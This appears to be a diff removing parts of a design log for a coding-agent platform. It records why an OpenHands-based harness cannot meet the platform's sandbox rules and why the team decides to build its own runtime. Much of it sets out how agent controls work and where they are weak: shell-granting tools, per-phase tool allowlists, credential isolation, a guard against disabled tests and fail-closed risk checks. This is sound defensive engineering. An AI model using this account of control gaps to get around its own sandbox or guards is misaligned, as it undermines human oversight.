-   sandbox loss be routine. Kill the container mid-attempt, repeatedly, and measure whether the event
-   log replays correctly or corrupts.
-3. **The upgrade treadmill's actual cost.** Pin v1.42.1, then re-run the conformance suite against
-   whatever ships eight weeks later. Nine minor versions in five weeks is the risk; measure it rather
-   than fearing it.
-
----
-
-# Phase 3.2 — what happened when the adapter met the actual server
-
-**Date: 2026-08-19.** 3.1 built the port from a reading of OpenHands' source. 3.2 tried to build the
-adapter and run it. The adapter exists; **the exit criterion — "conformance suite green against the
-real adapter" — is not met**, and the reasons are worth more than the adapter is.
-
-## 1. There is no current agent-server image you can pull on x86_64
-
-`ghcr.io/all-hands-ai/agent-server:latest` has no `linux/amd64` entry in its manifest list — arm64
-only. Walking the tag list, the amd64 build that does exist (`489858f-java`,
-`sha256:ff03d88a2379…`, 626 MB) reports **`openhands_sdk 1.0.0`** from its own dist-info. Twelve
-recent commit SHAs from `main` are not published as tags at all.
-
-So on an x86_64 host, running current OpenHands means **building the image yourself from source**.
-That is a standing operational cost — a Python toolchain, a multi-stage build, and an image to host —
-that Appendix B costed at zero. B.7 item 3 said the Python surface was "bounded by running it only as
-a containerised service"; that bound assumed somebody else builds the container.
-
-## 2. What the pullable build actually exposes
-
-Its own `/openapi.json`, which is authoritative in a way source reading is not — fifteen paths:
-
-```
-GET  /alive · /health · /server_info · /tools/list
-GET,POST     /api/conversations/
-GET,DELETE   /api/conversations/{id}
-GET,POST     /api/conversations/{id}/events/
-GET          /api/conversations/{id}/events/search · /count · /{event_id}
-POST         /api/conversations/{id}/events/respond_to_confirmation
-POST         /api/conversations/{id}/pause · /resume
-```
-
-**No `/api/git/*` at all.** Our `captureDiff` — the single way work leaves a sandbox under §16's
-host-brokered rule — has no endpoint on the only image we can run. There is also no `/run`, no
-`/security-analyzer`, and no `/confirmation-policy`, so the per-conversation ensemble analyser that
-the corrected Appendix B relied on to satisfy §17's asymmetry cannot be installed on this build
-either.
-
-## 3. Even at v1.42.1 there is no "give me the patch" endpoint
-
-`GET /git/diff` takes a **file** path and returns `{original, modified}` — whole contents, before and
-after. `GET /git/changes` lists changed files. Assembling a patch is the client's job.
-
-So the adapter carries a diff implementation (`UnifiedDiffs`). Not difficult, but note *why* it can't
-be the obvious three-line version: marking every line removed and every line added is a valid unified
-diff, and it makes §17's `TEST_DISABLED` fire on an `@Disabled` that was already in the file, so every
-attempt touching that file escalates for something it did not do. A guard that cries wolf gets turned
-off. The diff has to be real.
-
-## 4. `run` is fire-and-forget
-
-`POST /{id}/run` returns `Success` immediately — "start running the conversation in the background."
-Our port's `run` is blocking and returns a `HarnessStop`, so the adapter posts the instruction, then
-polls `GET /api/conversations/{id}` for `execution_status` while draining `events/search` by cursor.
-Workable, and it means every attempt carries a polling loop and a poll interval to tune.
-
-## 5. The one that is not a version problem: tool granularity
-
-Their unit of granting is a **tool class**, not a tool. The request takes
-`[{"name": "BashTool", ...}, {"name": "FileEditorTool", ...}]`.
-
-§15 says the allowlist is computed per attempt *and per phase* — `ANALYZING` gets read-only tools,
-`WRITE_GITHUB` exists only in `SUBMITTING` — and it says `run_command` is "an allowlisted set of
-binaries, not a shell", because "unrestricted shell also makes the sandbox's other controls largely
-decorative."
-
-**`BashTool` is a shell.** Asking for anything that runs a command grants arbitrary command
-execution, and there is no way to ask for less. Phase gating cannot be expressed at all: you get the
-toolset for the whole conversation.
-
-This is not fixable in an adapter, and no newer image helps. Three ways out, in order of preference:
-
-1. **Never grant `BashTool`.** Give the agent file tools only, and run the verification contract
-   ourselves through `SandboxProvider` — which §9 already wanted, since `VERIFYING` has no model in
-   the decision path. The agent edits; ForgeStack runs the tests. This keeps §15 intact and is the
-   option that fits the existing design best.
-2. **Put the allowlist on the sandbox's PATH** — a wrapper binary that refuses anything not in the
-   verification contract. Defence we control, inside a tool we do not.
-3. **Amend §15** to say that a bought harness with a shell tool cannot honour the binary allowlist,
-   and record what is lost. Honest, and the weakest.
-
-Option 1 is recommended and is close to free, because it removes work rather than adding it.
-
-## 6. Confirmed at the source of truth: the model key goes in the sandbox
-
-The create-conversation schema carries `agent.llm.api_key` — and, next to it, `base_url`. That is §16's
-newly-recorded gap confirmed by the API itself, and its mitigation sitting in the same object. Point
-`base_url` at the ForgeStack egress proxy and pass a per-attempt token worth nothing anywhere else.
-
-## What this changes
-
-Nothing about B.6's recommendation yet — but it moves the cost. The inner loop is still not worth
-building; it is just more expensive to *buy* than the appendix assumed: build and host the image
-ourselves, carry a patch assembler, carry a polling loop, and resolve the tool-granularity conflict
-before any of it is safe.
-
-**The spike Appendix B asked for is now much cheaper and much better specified.** It no longer needs
-to answer "can we keep transition authority" (yes, structurally — two databases, one ours) or "does
-the credential boundary hold" (yes, if we register no secrets and never grant `BashTool`). It needs
-to answer one thing: **resolution rate and cost per resolved task**, against an image we build, with
-option 1 above in place.
-
-Do that before writing another line of adapter.
-
----
-
-# Decision — build the execution runtime, keep the port
-
-**Date: 2026-08-19. This reverses Appendix B.6's "buy the inner loop" and supersedes it.** B.6 is left
-in place rather than edited, because the reasoning that led to it was sound given what was known, and
-a plan that quietly rewrites its own history teaches nobody anything.
-
-## What changed
-
-B.3's case rested on one claim: the inner loop is commodity, hardened over eighteen months, and *"we
-would spend M5–M8 rebuilding it and land somewhere worse."* Three findings retire that.
-
-**1. The loop is about a hundred lines.** [mini-swe-agent](https://github.com/SWE-agent/mini-swe-agent/)
-scores **>74% on SWE-bench Verified** — above the 72.8% B.3 credited OpenHands with — from ~100 lines
-of Python, with bash as its only tool and without using the models' tool-calling API at all. It is in
-production at Meta, NVIDIA and IBM. Whatever the resolution rate comes from, it is not the scaffold.
-
-**2. Our own constraints delete most of what we would be buying.** §15 forbids a shell, so not their
-`BashTool` — which 3.2 found is their only unit of granting for command execution. §16 forbids
-credentials in the sandbox, so not their secret registry and not agent-side git. §17 requires risk
-from path globs and change shape, so not their model-self-reported analyser. §18 requires tenancy
-they do not have. §10.3 requires our guards to decide completion. What is left to buy is a model
-call, a tool dispatch loop, and a condenser.
-
-**3. The Java gap closed.** B.2 said "there is no Java option at L2, and there will not be one" — true
-of coding-agent harnesses and irrelevant to what we actually need. Spring AI 2.0.0 **requires** Spring
-Boot 4.0/4.1 and Framework 7, which is what this application already runs, and it is already on the
-runtime classpath. Its user-controlled tool loop — call the model, execute tool calls yourself, feed
-results back — is §9's design exactly. §26's "Spring AI may prove immature on Boot 4.1" is closed by
-the dependency resolving.
-
-## What this does not change
-
-Everything B.6 put in the KEEP column, which was always the product. And the port: `ExecutionHarness`
-stays, with the native runtime as one implementation and `OpenHandsHarness` as the other. **Keeping a
-second adapter is what makes the abstraction honest** — an interface with one implementation is a
-guess about the future, and the conformance suite has already proved its worth by catching things the
-first implementation got wrong.
-
-## The risk this decision exposes rather than creates
-
-mini-swe-agent reaches 74% **with a shell and nothing else**. §15 says `run_command` is "an
-allowlisted set of binaries, not a shell", on the grounds that unrestricted shell makes every other
-sandbox control decorative.
-
-Both cannot be true at once. Either the allowlist costs materially less capability than the evidence
-suggests, or Forge resolves fewer tasks than an unconstrained agent and sells the difference as
-safety. **That trade has never been measured, and it is ours, not a vendor's.** Building the runtime
-does not create this risk — it stops it hiding behind somebody else's product decision.
-
-So the spike changes shape. It was never really OpenHands versus Claude. It is:
-
-> On a fixed set of seeded tasks, on our own runtime, what does resolution rate do when the agent has
-> an allowlisted tool set instead of a shell?
-
-Run it as soon as there is a runtime to run it on. If the gap is small, §15 is vindicated and the
-sandbox controls mean something. If the gap is large, §15 needs amending in the open — a wrapper
-binary on the sandbox PATH, or a shell inside a much stronger isolation boundary — rather than being
-quietly bypassed later by whoever is trying to make a demo work.
-
-## What we take from the research anyway
-
-Reading three harnesses closely was not wasted; it changes the design.
-
-- **Compaction as an event applied at read time.** Keep the whole log; a condensation is a row; the
-  view is computed. §11 and §14 had no answer for context growth beyond truncation.
-- **Deterministic stuck detection** over the last N events — repeated action-observation pairs,
-  repeated action-error runs, agent monologue, context-window loops. §9's escalation triggers were
-  prose; this is the working shape, and it is runtime-owned rather than model-reported.
-- **Max-severity fusion with fail-closed-to-HIGH** when a risk classifier throws. §17 states the
-  asymmetry and says nothing about a guard erroring.
-- **Tool spec separated from executor, resolved by name at runtime.** What makes a tool definition
-  crossable to a sandbox as JSON and bindable to environment-specific state on the far side.
-- **Every step ends in a committed checkpoint, and each is interruptible.** Already our design; worth
-  stating on the handler contract rather than leaving to habit.
-
-And one anti-lesson, from OpenHands V1's own rewrite: it relaxed mandatory sandboxing to **opt-in**,
-partly because MCP assumes local access to credentials and files. That is correct for a developer on
-their own machine and is a trade §16 and §18 cannot make. We take the event sourcing and leave the
-isolation model.
-
-## Build order
-
-`SandboxProvider` first (§16). It is needed under every option, has no model dependency, is the
-security perimeter, and — unlike anything involving a model — can be conformance-tested against real
-containers today. Then the tool catalogue and dispatch pipeline (§15), then `ModelRouter` on Spring
-AI (§13), then the loop and context assembly.
